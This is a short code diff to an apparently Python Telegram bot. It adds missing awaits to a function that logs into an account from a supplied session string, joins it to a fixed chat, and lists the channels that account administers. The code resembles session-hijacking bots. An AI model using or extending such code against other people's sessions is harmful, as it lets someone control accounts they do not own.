@@ -20,7 +20,7 @@ async def users_gc(session):
     try:
         if session.endswith("="):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            steve.connect()                          
+            await steve.connect()                          
             try:
                 await steve(join(CHAT))
             except Exception as e:
@@ -28,7 +28,7 @@ async def users_gc(session):
             k = await steve(GetAdminedPublicChannelsRequest())            
             for x in k.chats:                
                 msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
-        #    steve.disconnect()
+            await steve.disconnect()
                  
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
